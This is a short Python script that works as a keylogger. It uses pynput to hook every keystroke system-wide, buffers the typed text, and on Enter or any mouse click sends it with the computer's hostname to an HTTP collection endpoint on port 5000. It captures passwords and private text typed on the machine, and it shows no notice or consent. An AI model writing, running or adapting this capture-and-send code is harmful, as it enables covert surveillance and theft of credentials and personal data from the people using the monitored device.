import requests
import socket
from pynput import keyboard, mouse

sentence_buffer = []

# def send_sentence(sentence):
#     try:
#         requests.post("http://localhost:5000/event", json={"word": sentence})
#     except Exception as e:
#         print("Error sending sentence:", e)

def send_sentence(sentence):
    try:
        device_name = socket.gethostname()  # Get the device (host) name
        print(device_name)
        requests.post("http://localhost:5000/event", json={
            "word": sentence,
            "device": device_name
        })
    except Exception as e:
        print("Error sending sentence:", e)

def on_press(key):
    global sentence_buffer
    try:
        if hasattr(key, 'char') and key.char is not None:
            sentence_buffer.append(key.char)
        elif key == keyboard.Key.space:
            sentence_buffer.append(' ')  # Add space character
        elif key == keyboard.Key.enter:
            if sentence_buffer:
                sentence = ''.join(sentence_buffer).strip()
                send_sentence(sentence)
                sentence_buffer = []
    except Exception as e:
        print("Error in key press:", e)

def on_click(x, y, button, pressed):
    global sentence_buffer
    if pressed and sentence_buffer:
        sentence = ''.join(sentence_buffer).strip()
        send_sentence(sentence)
        sentence_buffer = []

if __name__ == "__main__":
    keyboard.Listener(on_press=on_press).start()
    mouse.Listener(on_click=on_click).start()
    while True:
        pass  # Keep script running
